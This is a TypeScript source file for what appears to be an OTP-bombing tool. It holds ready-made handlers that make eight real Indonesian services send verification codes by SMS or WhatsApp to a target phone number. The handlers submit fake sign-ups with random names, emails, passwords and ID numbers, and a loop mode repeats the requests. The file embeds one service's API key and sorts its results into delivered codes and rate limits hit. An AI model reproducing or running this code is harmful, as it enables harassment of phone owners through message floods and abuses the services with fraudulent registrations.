import os from 'os';
import crypto from 'crypto';

export interface PlatformDef {
  id: number;
  name: string;
  category?: string;
  handler: (phone62: string) => Promise<{ status: number; text: string; rawStatus?: string }>;
}

export interface LogEntry {
  id: string;
  round: number;
  platform_id: number;
  platform_name: string;
  status: 'SUCCESS' | 'LIMIT' | 'FAIL' | 'TIMEOUT' | 'INFO';
  detail: string;
  timestamp: string;
}

export interface JobState {
  status: 'idle' | 'running' | 'stopped' | 'completed';
  phone: string;
  phone_fmt: string;
  mode: 'single' | 'loop' | 'pick';
  delay: number;
  selected_platforms: number[];
  current_round: number;
  stats: {
    total: number;
    success: number;
    limit: number;
    fail: number;
  };
  logs: LogEntry[];
}

const USER_AGENTS = [
  'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
];

export function getUa(): string {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

export function normalizePhone(phone: string): string {
  if (!phone) return '';
  let n = String(phone).trim().replace(/\s+|-/g, '').replace(/^\+/, '');
  if (n.startsWith('08')) return '62' + n.substring(1);
  if (n.startsWith('8')) return '62' + n;
  if (n.startsWith('62')) return n;
  return '';
}

export function fmt08(p: string): string {
  return p.startsWith('62') ? '0' + p.substring(2) : p;
}

export function fmtplus(p: string): string {
  return p.startsWith('+') ? p : '+' + p;
}

export function fmtphone(p: string): string {
  if (p.startsWith('62')) return p.substring(2);
  if (p.startsWith('+62')) return p.substring(3);
  if (p.startsWith('0')) return p.substring(1);
  return p;
}

export function rndName(): string {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let rand = '';
  for (let i = 0; i < 5; i++) {
    rand += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return 'User' + rand;
}

export function rndEmail(): string {
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  let rand = '';
  for (let i = 0; i < 7; i++) {
    rand += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return `${rand}${Math.floor(100 + Math.random() * 900)}@gmail.com`;
}

let cachedIp: string | null = null;
export async function getPublicIp(): Promise<string> {
  if (cachedIp) return cachedIp;
  try {
    const res = await fetch('https://api.ipify.org', { signal: AbortSignal.timeout(4000) });
    if (res.ok) {
      cachedIp = (await res.text()).trim();
      return cachedIp;
    }
  } catch {
    // fallback
  }
  return '127.0.0.1';
}

// Fetch once in background
getPublicIp().catch(() => {});

// Classification verdict
export function evaluateVerdict(status: number, text: string): { status: 'SUCCESS' | 'LIMIT' | 'FAIL' | 'TIMEOUT'; detail: string } {
  if (status === 0) {
    return { status: 'TIMEOUT', detail: 'Koneksi timeout / offline 15s' };
  }
  const cleanBody = (text || '').substring(0, 180).replace(/[\r\n]+/g, ' ');
  const low = cleanBody.toLowerCase();

  if (
    low.includes('rate limit') ||
    low.includes('too many') ||
    low.includes('limit') ||
    low.includes('exceeded') ||
    low.includes('banned') ||
    low.includes('blocked') ||
    low.includes('tunggu 1x24') ||
    status === 429
  ) {
    return { status: 'LIMIT', detail: `(${status}) ${cleanBody.substring(0, 60)}` };
  }

  if (status === 200 || status === 201 || status === 202) {
    return { status: 'SUCCESS', detail: `(${status}) OK — OTP dikirim` };
  }

  return { status: 'FAIL', detail: `(${status}) ${cleanBody.substring(0, 50)}` };
}

// Platform Implementations
export const ALL_PLATFORMS: PlatformDef[] = [
  {
    id: 1,
    name: 'Internet Rakyat',
    category: 'ISP / Telco',
    handler: async (p62: string) => {
      try {
        const res = await fetch('https://internetrakyat.id/api/app/auth/send-otp-register', {
          method: 'POST',
          headers: {
            'User-Agent': getUa(),
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'x-api-key': '280999!FTTH',
            'Origin': 'https://internetrakyat.id',
            'Referer': 'https://internetrakyat.id/auth/register',
          },
          body: JSON.stringify({ phone_number: fmt08(p62) }),
          signal: AbortSignal.timeout(15000),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  {
    id: 2,
    name: 'HRS-BRE Career',
    category: 'Job Portal',
    handler: async (p62: string) => {
      try {
        const boundary = '----WebKitFormBoundary' + crypto.randomBytes(8).toString('hex');
        const nik = Array.from({ length: 16 }, () => Math.floor(Math.random() * 10)).join('');
        const pw = 'Aa1' + crypto.randomBytes(4).toString('hex');
        const email = rndEmail();
        const username = rndName();

        const body =
          `--${boundary}\r\nContent-Disposition: form-data; name="nik"\r\n\r\n${nik}\r\n` +
          `--${boundary}\r\nContent-Disposition: form-data; name="email"\r\n\r\n${email}\r\n` +
          `--${boundary}\r\nContent-Disposition: form-data; name="whatsapp"\r\n\r\n${fmt08(p62)}\r\n` +
          `--${boundary}\r\nContent-Disposition: form-data; name="username"\r\n\r\n${username}\r\n` +
          `--${boundary}\r\nContent-Disposition: form-data; name="password"\r\n\r\n${pw}\r\n` +
          `--${boundary}--\r\n`;

        const res = await fetch('https://career.hrs-bre.site/auth/sign_up_action', {
          method: 'POST',
          headers: {
            'User-Agent': getUa(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'id-ID,id;q=0.9',
            'Origin': 'https://career.hrs-bre.site',
            'Referer': 'https://career.hrs-bre.site/auth/sign_up',
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
          },
          body,
          signal: AbortSignal.timeout(15000),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  {
    id: 3,
    name: 'BonusBelanja',
    category: 'E-Commerce',
    handler: async (p62: string) => {
      try {
        const res = await fetch('https://www.bonusbelanja.com/api/auth/registration/app', {
          method: 'POST',
          headers: {
            'User-Agent': getUa(),
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://www.bonusbelanja.com',
            'Referer': 'https://www.bonusbelanja.com/register/',
          },
          body: JSON.stringify({ phone: p62, name: 'User', agreeTnc: true, agreeContact: true }),
          signal: AbortSignal.timeout(15000),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  {
    id: 4,
    name: 'Matahari Store',
    category: 'Retail',
    handler: async (p62: string) => {
      try {
        const res = await fetch('https://matahari-backend-prod.matahari.com/api/auth/register', {
          method: 'POST',
          headers: {
            'User-Agent': getUa(),
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://matahari.com',
          },
          body: JSON.stringify({
            emailAddress: rndEmail(),
            name: 'User',
            mobileCountryCode: '',
            mobileNumber: fmt08(p62),
            birthDate: '2000-01-01',
            genderId: '1',
            password: 'Pass' + crypto.randomBytes(3).toString('hex') + '@1',
            cardNumber: '',
            referralCode: '',
            salesmanId: '',
            pickupStoreCode: '',
            marketingCode: '',
          }),
          signal: AbortSignal.timeout(15000),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  {
    id: 5,
    name: 'TuneUp ID',
    category: 'Automotive',
    handler: async (p62: string) => {
      try {
        const name = 'PT ' + rndName();
        const params = new URLSearchParams();
        params.append('company_name', name);
        params.append('owner_name', rndName());
        params.append('address', 'Jl. Testing No ' + Math.floor(Math.random() * 100));
        params.append('email', rndEmail());
        params.append('phone_number', fmt08(p62));
        params.append('province_code', '32');
        params.append('city_code', '32.04');
        params.append('subscription_id', 'undefined');
        params.append('channel', 'whatsapp');
        params.append('agreement', 'true');
        params.append('service_categories[]', '3');

        const res = await fetch('https://api.tuneup.id/v1/mitra/register/send-otp', {
          method: 'POST',
          headers: {
            'Origin': 'https://dashboard.tuneup.id',
            'Referer': 'https://dashboard.tuneup.id/',
            'User-Agent': getUa(),
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: params.toString(),
          signal: AbortSignal.timeout(15000),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  {
    id: 6,
    name: 'Rumah123',
    category: 'Property',
    handler: async (p62: string) => {
      try {
        const ip = await getPublicIp();
        const res = await fetch('https://www.rumah123.com/api/otp/request-otp', {
          method: 'POST',
          headers: {
            'User-Agent': getUa(),
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://www.rumah123.com',
            'Referer': 'https://www.rumah123.com/user/login',
            'base-url-core': 'https://www.rumah123.com',
          },
          body: JSON.stringify({
            cancelledRequestId: crypto.randomUUID(),
            ipAddress: ip,
            phoneNumber: p62,
            portalId: 1,
            type: 'WHATSAPP',
            url: 'https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F',
          }),
          signal: AbortSignal.timeout(15000),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  {
    id: 7,
    name: 'Paper.id',
    category: 'Fintech',
    handler: async (p62: string) => {
      try {
        const res = await fetch('https://register.paper.id/api/v1/auth/register/send-otp', {
          method: 'POST',
          headers: {
            'User-Agent': getUa(),
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://paper.id',
            'x-paper-user-agent': 'multiverse/2.54.1 mobile_web (android) chrome',
          },
          body: JSON.stringify({ phone: p62, method: 'whatsapp', registered_by: 'flutter mweb' }),
          signal: AbortSignal.timeout(15000),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  {
    id: 8,
    name: 'DuniaGames',
    category: 'Gaming',
    handler: async (p62: string) => {
      try {
        const res = await fetch('https://api.duniagames.co.id/api/user/api/v2/user/send-otp', {
          method: 'POST',
          headers: {
            'User-Agent': getUa(),
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://duniagames.co.id',
            'x-device': crypto.randomUUID(),
          },
          body: JSON.stringify({ phoneNumber: fmtplus(p62), userName: fmtphone(p62) }),
          signal: AbortSignal.timeout(15000),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
];
